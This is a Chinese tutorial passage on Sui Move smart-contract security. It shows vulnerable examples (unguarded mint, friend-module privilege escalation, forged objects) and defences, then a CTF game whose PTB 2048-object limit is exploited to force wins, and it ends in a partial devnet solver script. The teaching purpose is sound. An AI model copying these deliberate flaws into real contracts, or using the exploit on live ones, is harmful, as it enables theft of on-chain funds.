fun fight_monster&lt;T&gt;(hero:  &amp;Hero, monster: &amp;Monster&lt;T&gt;):u64{
    let hero_strength = hero::strength(hero);
    let hero_defense = hero::defense(hero);
    let hero_hp = hero::hp(hero);
    let monster_hp = monster.hp;
    // attack the monster until its HP goes to zero
    let cnt = 0u64; // max fight times
    let rst = 0u64; // 0: tie, 1: hero win, 2: monster win;
    // 战斗逻辑...
    // 英雄和怪物互相攻击，hero_hp可能会减少
    // ...
    rst
}
</code></pre>
<h3 id="22-权限控制缺陷"><a class="header" href="#22-权限控制缺陷">2.2 权限控制缺陷</a></h3>
<p>不当的权限控制是跨合约交互中的常见漏洞：</p>
<p>缺少访问控制：关键函数未实施适当的权限检查。</p>
<pre><code class="language-move">// 铸造代币没有管理员检查
public entry fun mint_tokens(
    treasury_cap: &amp;mut TreasuryCap&lt;GAME_TOKEN&gt;,
    amount: u64,
    recipient: address,
    _config: &amp;GameConfig, // 仅用于读取配置，但没有检查调用者是否为管理员
    ctx: &amp;mut TxContext
) {
    // 缺少管理员权限验证！
    // 应该有：assert!(tx_context::sender(ctx) == config.admin, 0);
    // 检查系统是否暂停
    assert!(!_config.paused, 1);
    // 检查铸币上限
    assert!(amount &lt;= _config.daily_mint_limit, 2);
    // 铸造代币
    let minted_coins = coin::mint(treasury_cap, amount, ctx);
    // 转移给接收者
    transfer::public_transfer(minted_coins, recipient);
}
</code></pre>
<p>权限提升 ：通过中间模块绕过访问控制。例如，虽然模块A限制了函数访问，但模块B作为友元可以访问并暴露了该功能：</p>
<pre><code class="language-move">// 模块A
module game::treasury{
    friend game::trusted_manager;

    // 从国库提取资金 - 受限函数，只允许友元模块调用
    public(friend) fun withdraw(
        treasury: &amp;mut Treasury,
        amount: u64,
        recipient: address,
        ctx: &amp;mut TxContext
    ) {
        assert!(treasury.balance &gt;= amount, 0);
        treasury.balance = treasury.balance - amount;
        let coin = coin::mint_for_testing&lt;SUI&gt;(amount, ctx); 
        transfer::public_transfer(coin, recipient);
    }
}
</code></pre>
<pre><code class="language-move">// 模块B
module game::trusted_manager {
    public fun withdraw_funds(
        treasury: &amp;mut treasury::Treasury, 
        amount: u64, 
        recipient: address, 
        ctx: &amp;mut TxContext
    ) {
        // 风险：直接调用受限函数，没有进行任何权限验证
        // 应该在这里添加管理员检查，例如：
        // assert!(tx_context::sender(ctx) == ADMIN_ADDRESS, 0);
        treasury::withdraw(treasury, amount, recipient, ctx);
    }
}
</code></pre>
<p>验证绕过：接受外部验证结果而非直接验证。</p>
<pre><code class="language-move">// 依赖外部验证
public fun process_withdrawal(
    treasury: &amp;mut Treasury,
    request: WithdrawRequest,
    is_verified: bool, // 外部传入的验证结果
    ctx: &amp;mut TxContext
) {
    // 风险：直接信任外部传入的验证结果
    if (is_verified) {
        // 如果验证通过，执行提款
        let amount = request.amount;
        let recipient = request.recipient;
        assert!(treasury.balance &gt;= amount, 0);
        treasury.balance = treasury.balance - amount;
        let payment = coin::mint_for_testing&lt;SUI&gt;(amount, ctx);
        transfer::transfer(payment, recipient);
    }
}
</code></pre>
<h3 id="23-对象安全问题"><a class="header" href="#23-对象安全问题">2.3 对象安全问题</a></h3>
<p>对象在模块间传递时面临特殊风险：</p>
<p>对象伪造：攻击者创建结构相似但非法的对象。</p>
<pre><code class="language-move">// 使用无价值的FakeCoin也可以获取投票权
public entry fun register_voter&lt;T&gt;(vote_coin: coin::Coin&lt;T&gt;, ctx: &amp;mut TxContext) {
    let amount = vote_coin.value();
    assert!(amount == 100,1);
    let sender = tx_context::sender(ctx);
    let token = VoteToken&lt;T&gt; {
        id: object::new(ctx),
        amount: 100,
    };
    public_transfer(token, sender);
    public_transfer(vote_coin, @0x0);
}
</code></pre>
<p>生命周期管理：对象创建和销毁的责任不明确。例如，谁负责销毁临时对象：</p>
<pre><code class="language-move">// 这里我们通过获得的宝藏对象去获取一次拿flag的机会，那么如果我们没有正确销毁对象，
// 就会通过这一个宝藏对象无限get_flag
public entry fun get_flag(box: TreasuryBox, ctx: &amp;mut TxContext) {
    // 应该添加这两行代码使一个宝藏对象只能获取一次flag的机会
    // let TreasuryBox { id } = box; 
    // object::delete(id);
    let d100 = random::rand_u64_range(0, 100, ctx);        
    if (d100 == 0) {
        event::emit(Flag { user: tx_context::sender(ctx), flag: true });
    }
}
</code></pre>
<h2 id="3-跨合约交互的实践"><a class="header" href="#3-跨合约交互的实践">3. 跨合约交互的实践</a></h2>
<h3 id="31-ptb交易"><a class="header" href="#31-ptb交易">3.1 PTB交易</a></h3>
<p>PTB（程序化事务块）是Sui区块链的一种高级功能，它允许在单一事务中组合多个操作。与传统区块链系统中每个事务只能执行单一操作的限制不同，PTB提供了更高的灵活性和效率。在PTB中，开发者可以将多个操作组合成一个事务，并按特定的逻辑执行，操作之间也可以互相依赖。</p>
<h3 id="32-案例分析利用ptb对象创建限制的随机数预测攻击"><a class="header" href="#32-案例分析利用ptb对象创建限制的随机数预测攻击">3.2 案例分析：利用PTB对象创建限制的随机数预测攻击</a></h3>
<p>我们需要知道的一个知识点就是Sui PTB有一次最多创建2048个对象的限制。</p>
<pre><code class="language-move">let current_timestamp = clock::timestamp_ms(clock);
let d100 = current_timestamp % 3;
if (d100 == 1) {
    let coin_1 = mint(treasury_cap,ctx);
    coin::join(coin,coin_1);
}else{
    let obj = NoUse {
        id: object::new(ctx),
        value: 100,
    };
    transfer::transfer(obj, tx_context::sender(ctx));
    let burned_coin = coin::split(coin, 5,ctx);
    burn(treasury_cap, burned_coin);
};
</code></pre>
<p>在这段代码里面赢了我们可以获取一些代币，输了则会扣除相应的代币，但是这里输的逻辑会比赢得逻辑多创建一个对象，那么我们如何做一直赢呢。这就是用到PTB一次最多创建2048个对象限制的概念。我们预先创建2047个对象，赢得时候会在mint的时候创建一个对象，而输的时候就会创建两个对象，超过2048这个阀值，这样就可以保证只有赢得逻辑才能成功上链。</p>
<h2 id="4-防御策略"><a class="header" href="#4-防御策略">4. 防御策略</a></h2>
<h3 id="41-严格的访问控制"><a class="header" href="#41-严格的访问控制">4.1 严格的访问控制</a></h3>
<p>最小权限原则：仅暴露必要的功能，使用 public(friend) 限制访问。</p>
<pre><code class="language-move">public(friend) fun sensitive_operation() { ... }
</code></pre>
<p>显式验证：在关键操作前验证调用者身份或权限。</p>
<pre><code class="language-move">// 验证是否有管理员权限
public entry fun admin_operation(admin: &amp;AdminCap) {   
    assert!(admin.is_valid(), ERROR_INVALID_ADMIN);    
}
</code></pre>
<p>不可变引用：优先使用不可变引用（&amp;T）而非可变引用（&amp;mut T）。</p>
<pre><code class="language-move">public fun read_only_operation(obj: &amp;Object) { ... }
</code></pre>
<h3 id="42-模块间协议"><a class="header" href="#42-模块间协议">4.2 模块间协议</a></h3>
<p>明确契约：定义清晰的模块间交互契约，包括前置条件和后置条件。</p>
<pre><code class="language-move">public fun redeem(
    token: RedeemToken,
    pool: &amp;mut TokenPool,
    ctx: &amp;mut TxContext
) {
    // 前置条件：
    // token.amount &gt; 0 - 代币金额必须大于0
    // pool 中必须有足够的SUI余额支付兑换
    let RedeemToken { id, amount } = token;
    assert!(amount &gt; 0,error::invalid_argument(E_INSUFFICIENT_AMOUNT));
    let sui_amount = amount * pool.exchange_rate;
    assert!(balance::value(&amp;pool.balance) &gt;= sui_amount, error::resource_exhausted(0));
    object::delete(id);
    // 后置条件：
    // token完全消耗
    // 用户获得等值的SUI资产 - 按照汇率计算的SUI被转移给用户
    let sui_coin = coin::take(&amp;mut pool.balance, sui_amount, ctx);
    transfer::public_transfer(sui_coin, tx_context::sender(ctx));
}
</code></pre>
<p>事件通知：使用事件记录关键操作，便于跟踪和审计。</p>
<pre><code class="language-move">public fun important_operation() {    
    event::emit(OperationEvent { ... });
}
</code></pre>
<p>版本控制：实施版本控制机制，确保兼容性。</p>
<pre><code class="language-move">// 强制要求版本兼容，否则中止执行
public fun require_version(
    version_obj: &amp;ProtocolVersion,
    required_version: u64
) {
    assert!(
        version_obj.version &gt;= required_version,
        error::invalid_state(E_VERSION_MISMATCH)
    );
}
</code></pre>
<h2 id="结论"><a class="header" href="#结论">结论</a></h2>
<p>跨合约交互是构建复杂Sui Move应用的基础，但也引入了独特的安全挑战。通过理解潜在风险、实施严格的访问控制、安全地处理对象、建立清晰的模块间协议，开发者可以构建更安全的智能合约系统。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="实践利用交互实现攻击"><a class="header" href="#实践利用交互实现攻击">实践：利用交互实现攻击</a></h1>
<h2 id="题目描述-2"><a class="header" href="#题目描述-2">题目描述</a></h2>
<p>这是一个基于Sui Move开发的英雄冒险游戏。在这个游戏中，玩家可以控制一个英雄角色，与野猪和野猪王进行战斗，获取经验值和装备，提升自己的等级和能力。游戏包含了完整的战斗系统、物品系统和随机数生成机制。</p>
<h2 id="示例代码-2"><a class="header" href="#示例代码-2">示例代码</a></h2>
<p>以下是game::adventure模块的代码，这个合约主要是创建怪兽和打怪兽的函数，最后还有一个买宝箱的函数：</p>
<pre><code class="language-move">module game::adventure {
    use game::inventory;
    use game::hero::{Self, Hero};
    use ctf::random;
    use sui::event;
    use sui::object::{Self, ID, UID};
    use sui::transfer;
    use sui::tx_context::{Self, TxContext};
    use sui::clock;
    use sui::table::{Self, Table};

    struct Monster&lt;phantom T&gt; has key {
        id: UID,
        hp: u64,
        strength: u64,
        defense: u64,
    }

    struct Boar {}
    struct BoarKing {}

    struct SlainEvent&lt;phantom T&gt; has copy, drop {
        slayer_address: address,
        hero: ID,
        boar: ID,
    }

    const EHERO_TIRED: u64 = 1;
    const ENO_SWORD: u64 = 4;
    const ENO_ARMOR: u64 = 5;
    const ERROR_NO_MONEY: u64 = 6;
    const ERROR_NO_TOKEN:u64 = 10;


    const BOAR_MIN_HP: u64 = 80;
    const BOAR_MAX_HP: u64 = 120;
    const BOAR_MIN_STRENGTH: u64 = 5;
    const BOAR_MAX_STRENGTH: u64 = 15;
    const BOAR_MIN_DEFENSE: u64 = 4;
    const BOAR_MAX_DEFENSE: u64 = 6;

    const BOARKING_MIN_HP: u64 = 180;
    const BOARKING_MAX_HP: u64 = 220;
    const BOARKING_MIN_STRENGTH: u64 = 20;
    const BOARKING_MAX_STRENGTH: u64 = 25;
    const BOARKING_MIN_DEFENSE: u64 = 10;
    const BOARKING_MAX_DEFENSE: u64 = 15;

    struct NoUse has key{
        id: UID,
        value: u64,
    }

    struct UsersTokenAmount has key ,store{
        id: UID,
        balances: Table&lt;address, u64&gt;
    }
    struct Amount has copy, drop {
        amount: u64
    }
  
    fun init(ctx: &amp;mut TxContext) {
        let id = object::new(ctx);
        let usersTokenAmount = UsersTokenAmount {
            id: id,
            balances: table::new&lt;address, u64&gt;(ctx)
        };
        transfer::public_share_object(usersTokenAmount);
    }

    fun create_monster&lt;T&gt;(
        min_hp: u64, max_hp: u64,
        min_strength: u64, max_strength: u64,
        min_defense: u64, max_defense: u64,
        ctx: &amp;mut TxContext
    ): Monster&lt;T&gt; { 
        let id = object::new(ctx);       
        let hp = random::rand_u64_range(min_hp, max_hp, ctx);
        let strength = random::rand_u64_range(min_strength, max_strength, ctx);
        let defense = random::rand_u64_range(min_defense, max_defense, ctx);
        Monster&lt;T&gt; {
            id,
            hp,
            strength,
            defense,
        }
    }

    fun fight_monster&lt;T&gt;(hero: &amp;Hero, monster: &amp;Monster&lt;T&gt;): u64 {
        let hero_strength = hero::strength(hero);
        let hero_defense = hero::defense(hero);
        let hero_hp = hero::hp(hero);
        let monster_hp = monster.hp;
        let cnt = 0u64; 
        let rst = 0u64; 
        while (monster_hp &gt; 0) {
            let damage = if (hero_strength &gt; monster.defense) {
                hero_strength - monster.defense
            } else {
                0
            };
            if (damage &lt; monster_hp) {
                monster_hp = monster_hp - damage;
                let damage = if (monster.strength &gt; hero_defense) {
                    monster.strength - hero_defense
                } else {
                    0
                };
                if (damage &gt;= hero_hp) {
                    rst = 2;
                    break
                } else {
                    hero_hp = hero_hp - damage;
                }
            } else {
                rst = 1;
                break
            };
            cnt = cnt + 1;
            if (cnt &gt; 20) {
                break
            }
        };
        rst
    }

    public entry fun slay_boar(hero: &amp;mut Hero, ctx: &amp;mut TxContext) {
        assert!(hero::stamina(hero) &gt; 0, EHERO_TIRED);
        let boar = create_monster&lt;Boar&gt;(
            BOAR_MIN_HP, BOAR_MAX_HP,
            BOAR_MIN_STRENGTH, BOAR_MAX_STRENGTH,
            BOAR_MIN_DEFENSE, BOAR_MAX_DEFENSE,
            ctx
        );
        let fight_result = fight_monster&lt;Boar&gt;(hero, &amp;boar);
        hero::decrease_stamina(hero, 1);
     
        if (fight_result == 1) {
            hero::increase_experience(hero, 10);

            let d100 = random::rand_u64_range(0, 100, ctx);
            if (d100 &lt; 10) {
                let sword = inventory::create_sword(ctx);
                hero::equip_or_levelup_sword(hero, sword, ctx);
            } else if (d100 &lt; 20) {
                let armor = inventory::create_armor(ctx);
                hero::equip_or_levelup_armor(hero, armor, ctx);
            };
        };
        
        event::emit(SlainEvent&lt;Boar&gt; {
            slayer_address: tx_context::sender(ctx),
            hero: hero::id(hero),
            boar: object::uid_to_inner(&amp;boar.id),
        });
        let Monster&lt;Boar&gt; { id, hp: _, strength: _, defense: _} = boar;
        object::delete(id);
    }

    public entry fun init_balances(usersTokenAmount: &amp;mut UsersTokenAmount, ctx: &amp;mut TxContext){
        let sender = tx_context::sender(ctx);
        if (!table::contains(&amp;usersTokenAmount.balances, sender)) {
                table::add(&amp;mut usersTokenAmount.balances, sender, 100);
        }else{
            let current_balance = table::borrow_mut(&amp;mut usersTokenAmount.balances, sender);
            *current_balance = 100;
        }
    }

    entry fun slay_boar_king(clock: &amp;clock::Clock, usersTokenAmount: &amp;mut UsersTokenAmount, hero: &amp;mut Hero, ctx: &amp;mut TxContext) {
        let sender = tx_context::sender(ctx);
        assert!(hero::stamina(hero) &gt; 0, EHERO_TIRED);
        let boar = create_monster&lt;BoarKing&gt;(
            BOARKING_MIN_HP, BOARKING_MAX_HP,
            BOARKING_MIN_STRENGTH, BOARKING_MAX_STRENGTH,
            BOARKING_MIN_DEFENSE, BOARKING_MAX_DEFENSE,
            ctx
        );
        let fight_result = fight_monster&lt;BoarKing&gt;(hero, &amp;boar);
        //hero::decrease_stamina(hero, 2);

        if (fight_result == 1) { 
            let current_timestamp = clock::timestamp_ms(clock);
            let d100 = current_timestamp % 3;

            if (d100 == 1) {
                let current_balance = table::borrow_mut(&amp;mut usersTokenAmount.balances, sender);
                *current_balance = *current_balance + 5;
                event::emit(Amount{amount: *current_balance});
            }else{  
                let current_balance = table::borrow_mut(&amp;mut usersTokenAmount.balances, sender);
                *current_balance = *current_balance - 5;
                event::emit(Amount{amount: *current_balance});
               
                let obj = NoUse {
                    id: object::new(ctx),
                    value: 100,
                };
                transfer::transfer(obj, tx_context::sender(ctx));
                
            };
        };

        event::emit(SlainEvent&lt;BoarKing&gt; {
            slayer_address: tx_context::sender(ctx),
            hero: hero::id(hero),
            boar: object::uid_to_inner(&amp;boar.id),
        });
        let Monster&lt;BoarKing&gt; { id, hp: _, strength: _, defense: _} = boar;
        object::delete(id);
    }

    public entry fun buy_box(usersTokenAmount: &amp;mut UsersTokenAmount ,ctx: &amp;mut TxContext) {
        let sender = tx_context::sender(ctx);
        let current_balance = table::borrow_mut(&amp;mut usersTokenAmount.balances, sender);
        event::emit(Amount{amount: *current_balance});
        assert!(*current_balance &gt;= 200,ERROR_NO_MONEY);
         *current_balance = *current_balance - 100;
        let box = inventory::create_treasury_box(ctx);
        transfer::public_transfer(box, tx_context::sender(ctx));
    }

    public fun get_balances(usersTokenAmount: &amp;mut UsersTokenAmount, ctx: &amp;mut TxContext): u64{
        let sender = tx_context::sender(ctx);
        let current_balance = table::borrow_mut(&amp;mut usersTokenAmount.balances, sender);
        *current_balance
    }

}
</code></pre>
<p>以下是game::hero模块的代码，这个合约是查看英雄属性，给英雄配置装备的一些函数：</p>
<pre><code class="language-move">module game::hero {
    use game::inventory::{Self, Sword, Armor};

    use sui::object::{Self, ID, UID};
    use sui::transfer;
    use sui::tx_context::TxContext;
    use std::option::{Self, Option};

    friend game::adventure;


    struct Hero has key, store {
        id: UID,
        level: u64,
        stamina: u64,
        hp: u64,
        experience: u64,
        strength: u64,
        defense: u64,
        sword: Option&lt;Sword&gt;,
        armor: Option&lt;Armor&gt;,
    }

    const MAX_LEVEL: u64 = 2;
    const INITAL_HERO_HP: u64 = 100;
    const INITIAL_HERO_STRENGTH: u64 = 10;
    const INITIAL_HERO_DEFENSE: u64 = 5;
    const HERO_STAMINA: u64 = 200;

    const EBOAR_WON: u64 = 0;
    const EHERO_TIRED: u64 = 1;
    const ENOT_ADMIN: u64 = 2;
    const EINSUFFICIENT_FUNDS: u64 = 3;
    const ENO_SWORD: u64 = 4;
    const ENO_ARMOR: u64 = 5;
    const ASSERT_ERR: u64 = 6;
    const EHERO_REACH_MAX_LEVEL: u64 = 7;

    fun init(ctx: &amp;mut TxContext) {
        let hero = create_hero(ctx);
        transfer::share_object(hero);
    }

    public(friend) fun create_hero(ctx: &amp;mut TxContext): Hero {
        Hero {
            id: object::new(ctx),
            level: 1,
            stamina: HERO_STAMINA,
            hp: INITAL_HERO_HP,
            experience: 0,
            strength: INITIAL_HERO_STRENGTH,
            defense: INITIAL_HERO_DEFENSE,
            sword: option::none(),
            armor: option::none(),
        }
    }

    public fun strength(hero: &amp;Hero): u64 {
        if (hero.hp == 0) {
            return 0
        };

        let sword_strength = if (option::is_some(&amp;hero.sword)) {
            inventory::strength(option::borrow(&amp;hero.sword))
        } else {
            0
        };
        hero.strength + sword_strength
    }

    public fun defense(hero: &amp;Hero): u64 {
        if (hero.hp == 0) {
            return 0
        };

        let armor_defense = if (option::is_some(&amp;hero.armor)) {
            inventory::defense(option::borrow(&amp;hero.armor))
        } else {
            0
        };
        hero.defense + armor_defense
    }

    public fun hp(hero: &amp;Hero): u64 {
        hero.hp
    }

    public fun experience(hero: &amp;Hero): u64 {
        hero.experience
    }

    public fun stamina(hero: &amp;Hero): u64 {
        hero.stamina
    }

    public(friend) fun increase_experience(hero: &amp;mut Hero, experience: u64) {
        hero.experience = hero.experience + experience;
    }

    public(friend) fun id(hero: &amp;Hero): ID {
        object::uid_to_inner(&amp;hero.id)
    }

    public(friend) fun decrease_stamina(hero: &amp;mut Hero, stamina: u64) {
        hero.stamina = hero.stamina - stamina;
    }

    public entry fun level_up(hero: &amp;mut Hero) {
        assert!(hero.level &lt; MAX_LEVEL, EHERO_REACH_MAX_LEVEL);
        if (hero.experience &gt;= 100) {
            hero.level = hero.level + 1;
            hero.strength = hero.strength + INITIAL_HERO_STRENGTH*3;
            hero.defense = hero.defense + INITIAL_HERO_DEFENSE*3;
            hero.hp = hero.hp + INITAL_HERO_HP;
            hero.experience = hero.experience - 100;
        }
    }

    public fun equip_or_levelup_sword(hero: &amp;mut Hero, new_sword: Sword, ctx: &amp;mut TxContext) {
        let sword = if (option::is_some(&amp;hero.sword)) {
            let sword = option::extract(&amp;mut hero.sword);
            inventory::level_up_sword(&amp;mut sword, new_sword, ctx);
            sword
        } else {
            new_sword
        };
        option::fill(&amp;mut hero.sword, sword);
    }


    public fun remove_sword(hero: &amp;mut Hero): Sword {
        assert!(option::is_some(&amp;hero.sword), ENO_SWORD);
        option::extract(&amp;mut hero.sword)
    }

    public fun equip_or_levelup_armor(hero: &amp;mut Hero, new_armor: Armor, ctx: &amp;mut TxContext) {
        let armor = if (option::is_some(&amp;hero.armor)) {
            let armor = option::extract(&amp;mut hero.armor);
            inventory::level_up_armor(&amp;mut armor, new_armor, ctx);
            armor
        } else {
            new_armor
        };
        option::fill(&amp;mut hero.armor, armor);
    }


    public fun remove_armor(hero: &amp;mut Hero): Armor {
        assert!(option::is_some(&amp;hero.armor), ENO_ARMOR);
        option::extract(&amp;mut hero.armor)
    }

    public fun destroy_hero(hero: Hero) {
        let Hero {id, level: _, stamina: _, hp: _, experience: _, strength: _, defense: _, sword, armor} = hero;
        object::delete(id);
        if (option::is_some(&amp;sword)) {
            let sword = option::destroy_some(sword);
            inventory::destroy_sword(sword);
        } else {
            option::destroy_none(sword);
        };
        if (option::is_some(&amp;armor)) {
            let armor = option::destroy_some(armor);
            inventory::destroy_armor(armor);
        } else {
            option::destroy_none(armor);
        };
    }
}
</code></pre>
<p>以下是game::inventory模块的代码，这个合约主要是升级装备，查看装备属性的函数，最后还有一个获取flag的函数：</p>
<pre><code class="language-move">module game::inventory {
    use ctf::random;
    
    use sui::object::{Self, UID};
    use sui::tx_context::{Self, TxContext};
    use sui::event;

    friend game::adventure;

    const MAX_RARITY: u64 = 5;
    const BASE_SWORD_STRENGTH: u64 = 2;
    const BASE_ARMOR_DEFENSE: u64 = 1;

    struct Sword has store {
        rarity: u64,
        strength: u64,
    }

    struct Armor has store {
        rarity: u64,
        defense: u64,
    }

    struct TreasuryBox has key, store {
        id: UID,
    }

    struct Flag has copy, drop {
        user: address,
        flag: bool
    }

    public(friend) fun create_treasury_box(ctx: &amp;mut TxContext): TreasuryBox {
        TreasuryBox {
            id: object::new(ctx)
        }
    }

    public(friend) fun create_sword(_ctx: &amp;mut TxContext): Sword {
        Sword {
            rarity: 1,
            strength: BASE_SWORD_STRENGTH,
        }
    }

    public fun destroy_sword(sword: Sword) {
        let Sword { rarity: _, strength: _} = sword;
    }

    public(friend) fun create_armor(_ctx: &amp;mut TxContext): Armor {
        Armor {
            rarity: 1,
            defense: BASE_ARMOR_DEFENSE,
        }
    }

    public fun destroy_armor(armor: Armor) {
        let Armor { rarity: _, defense: _} = armor;
    }

    public fun strength(sword: &amp;Sword): u64 {
        sword.strength * sword.rarity
    }

    public fun defense(armor: &amp;Armor): u64 {
        armor.defense * armor.rarity
    }  

    public fun sword_rarity(sword: &amp;Sword): u64 {
        sword.rarity
    }

    public fun armor_rarity(armor: &amp;Armor): u64 {
        armor.rarity
    }

    public fun level_up_sword(sword: &amp;mut Sword, material: Sword, ctx: &amp;mut TxContext) {
        if (sword.rarity &lt; MAX_RARITY) {
            let prob = random::rand_u64_range(0, sword.rarity, ctx);
            if (prob &lt; 1) {
                sword.rarity = sword.rarity + 1;
            }
        };
        destroy_sword(material);
    }

    public fun level_up_armor(armor: &amp;mut Armor, material: Armor, ctx: &amp;mut TxContext) {
        if (armor.rarity &lt; MAX_RARITY) {
            let prob = random::rand_u64_range(0, armor.rarity, ctx);
            if (prob &lt; 1) {
                armor.rarity = armor.rarity + 1;
            }
        };
        destroy_armor(material);
    }

    public entry fun get_flag(box: TreasuryBox, ctx: &amp;mut TxContext) {
        let TreasuryBox { id } = box;
        object::delete(id);
        event::emit(Flag { user: tx_context::sender(ctx), flag: true });
    }
}
</code></pre>
<p>以下是ctf::random模块的代码，这个合约主要是生成随机数的合约：</p>
<pre><code class="language-move">module ctf::random {
    use std::hash;
    use std::vector;

    use sui::bcs;
    use sui::object;
    use sui::tx_context::TxContext;
    use std::debug;
    use sui::event;
    
    const ERR_HIGH_ARG_GREATER_THAN_LOW_ARG: u64 = 101;
    
    fun seed(ctx: &amp;mut TxContext): vector&lt;u8&gt; {
        let ctx_bytes = bcs::to_bytes(ctx);
        let info: vector&lt;u8&gt; = vector::empty&lt;u8&gt;();
        vector::append&lt;u8&gt;(&amp;mut info, ctx_bytes);
        let hash: vector&lt;u8&gt; = hash::sha3_256(info);
        hash
        
    }

    fun bytes_to_u64(bytes: vector&lt;u8&gt;): u64 {
        let value = 0u64;
        let i = 0u64;
        while (i &lt; 8) {
            value = value | ((*vector::borrow(&amp;bytes, i) as u64) &lt;&lt; ((8 * (7 - i)) as u8));
            i = i + 1;
        };
        return value
    }

    fun rand_u64_with_seed(_seed: vector&lt;u8&gt;): u64 {
        bytes_to_u64(_seed)
    }

    fun rand_u64_range_with_seed(_seed: vector&lt;u8&gt;, low: u64, high: u64): u64 {
        assert!(high &gt; low, ERR_HIGH_ARG_GREATER_THAN_LOW_ARG);
        let value = rand_u64_with_seed(_seed);
        (value % (high - low)) + low
    }

    public fun rand_u64(ctx: &amp;mut TxContext): u64 {
        rand_u64_with_seed(seed(ctx))
    }

    public fun rand_u64_range(low: u64, high: u64, ctx: &amp;mut TxContext): u64 {
        rand_u64_range_with_seed(seed(ctx), low, high)
    }
}
</code></pre>
<h2 id="任务目标-1"><a class="header" href="#任务目标-1">任务目标</a></h2>
<p>理解代码，通过代码中的漏洞，构造攻击链，拿到box。</p>
<pre><code class="language-move">public entry fun get_flag(box: TreasuryBox, ctx: &amp;mut TxContext) {
    let TreasuryBox { id } = box;
    object::delete(id);
    event::emit(Flag { user: tx_context::sender(ctx), flag: true });
}
</code></pre>
<h2 id="题目中的漏洞"><a class="header" href="#题目中的漏洞">题目中的漏洞</a></h2>
<p>没有考虑PTB交易一次最多创建2048个对象，输的逻辑比赢得逻辑多一个对象，可以通过让对象达到2048的阀值，导致后面只能走赢得逻辑才会成功上链。</p>
<pre><code class="language-move">if (d100 == 1) {
    let current_balance = table::borrow_mut(&amp;mut usersTokenAmount.balances, sender);
    *current_balance = *current_balance + 5;
    event::emit(Amount{amount: *current_balance});
}else{  
    let current_balance = table::borrow_mut(&amp;mut usersTokenAmount.balances, sender);
    *current_balance = *current_balance - 5;
    event::emit(Amount{amount: *current_balance});
               
    let obj = NoUse {
        id: object::new(ctx),
        value: 100,
     };
    transfer::transfer(obj, tx_context::sender(ctx));    
};
</code></pre>
<h2 id="解题思路-1"><a class="header" href="#解题思路-1">解题思路</a></h2>
<p>可以看到我们要获取flag就必须先拿到box，那么怎么获取这个宝箱呢，</p>
<pre><code class="language-move">public entry fun buy_box(usersTokenAmount: &amp;mut UsersTokenAmount ,ctx: &amp;mut TxContext) {
    let sender = tx_context::sender(ctx);
    let current_balance = table::borrow_mut(&amp;mut usersTokenAmount.balances, sender);
    event::emit(Amount{amount: *current_balance});
    assert!(*current_balance &gt;= 200,ERROR_NO_MONEY);
    *current_balance = *current_balance - 100;
    let box = inventory::create_treasury_box(ctx);
    transfer::public_transfer(box, tx_context::sender(ctx));
}
</code></pre>
<p>这里获取box的唯一方式就是调用buy_box函数，看到这我们可以知道只要我们的balance大200，就可以购买这个宝箱，接下来我们寻找可以获得balance的函数：</p>
<pre><code class="language-move">public entry fun init_balances(usersTokenAmount: &amp;mut UsersTokenAmount, ctx: &amp;mut TxContext){
    let sender = tx_context::sender(ctx);
    if (!table::contains(&amp;usersTokenAmount.balances, sender)) {
        table::add(&amp;mut usersTokenAmount.balances, sender, 100);
    }else{
        let current_balance = table::borrow_mut(&amp;mut usersTokenAmount.balances, sender);
        *current_balance = 100;
    }
}
</code></pre>
<p>第一个是在init_balances函数会为指定地址初始化一个100金额。</p>
<pre><code class="language-move">entry fun slay_boar_king(clock: &amp;clock::Clock, usersTokenAmount: &amp;mut UsersTokenAmount, hero: &amp;mut Hero, ctx: &amp;mut TxContext) {
    let sender = tx_context::sender(ctx);
    assert!(hero::stamina(hero) &gt; 0, EHERO_TIRED);
    let boar = create_monster&lt;BoarKing&gt;(
        BOARKING_MIN_HP, BOARKING_MAX_HP,
        BOARKING_MIN_STRENGTH, BOARKING_MAX_STRENGTH,
        BOARKING_MIN_DEFENSE, BOARKING_MAX_DEFENSE,
        ctx
    );
    let fight_result = fight_monster&lt;BoarKing&gt;(hero, &amp;boar);

    if (fight_result == 1) { 
        let current_timestamp = clock::timestamp_ms(clock);
        let d100 = current_timestamp % 3;

        if (d100 == 1) {
            let current_balance = table::borrow_mut(&amp;mut usersTokenAmount.balances, sender);
            *current_balance = *current_balance + 5;
            event::emit(Amount{amount: *current_balance});
        }else{  
            let current_balance = table::borrow_mut(&amp;mut usersTokenAmount.balances, sender);
            *current_balance = *current_balance - 5;
            event::emit(Amount{amount: *current_balance});
               
            let obj = NoUse {
                id: object::new(ctx),
                value: 100,
            };
            transfer::transfer(obj, tx_context::sender(ctx));    
        };
    };

    event::emit(SlainEvent&lt;BoarKing&gt; {
        slayer_address: tx_context::sender(ctx),
        hero: hero::id(hero),
        boar: object::uid_to_inner(&amp;boar.id),
    });
    let Monster&lt;BoarKing&gt; { id, hp: _, strength: _, defense: _} = boar;
    object::delete(id);
}
</code></pre>
<p>在打野猪王的时候，打赢野猪王有1/3的概率加5个balance。但是也有2/3的概率减去5个balance。
因为创建野猪王时会创建一个对象，所以我预先只需要创建2047个对象，然后创建野猪王加1就是达到2048个对象的阀值，这样就做到只有赢得逻辑才能成功上链，输的逻辑会因为多创建一个对象超过2048而一直报错。</p>
<h2 id="题解"><a class="header" href="#题解">题解</a></h2>
<pre><code class="language-js">import { Transaction } from '@mysten/sui/transactions';
import { SuiClient, getFullnodeUrl } from '@mysten/sui/client';
import { Ed25519Keypair } from '@mysten/sui/keypairs/ed25519';
import axios from 'axios';

const MNEMONIC = '';// 自己的助记词
const keypair = Ed25519Keypair.deriveKeypair(MNEMONIC);
const publicKey = keypair.getPublicKey();
const address = publicKey.toSuiAddress();
console.log('Wallet Address:', address);
const client = new SuiClient({ url: getFullnodeUrl('devnet') });
let balance = await client.getBalance({ owner: address });
console.log('Account Balance:', balance);
const heroId = '';// heroId
const userTokenAmountId = '';// userTokenAmountId
const PACKAGE_ID = ''; // PACKAGE_ID
const suiRpcUrl = 'https://fullnode.devnet.sui.io/';

async function get_experience() {
    try {
        const response = await axios.post(suiRpcUrl,{jsonrpc: '2.0',id: 1, method: 'sui_getObject',params: [heroId,{showType: true,showOwner: true,showDepth: true,showContent: true,showDisplay: true,},],},{headers: {'Content-Type': 'application/json',},});
        const fields = response.data.result?.data?.content?.fields;
        if (fields) {console.log('Experience:', fields.experience);console.log('Level', fields.level)} else {console.log('No fields found in the object.');}
        return fields.experience 
    } catch (error) {
        console.error('Error fetching object data:', error.message);
    }
}

async function get_transaction_events(digest) {
    try {
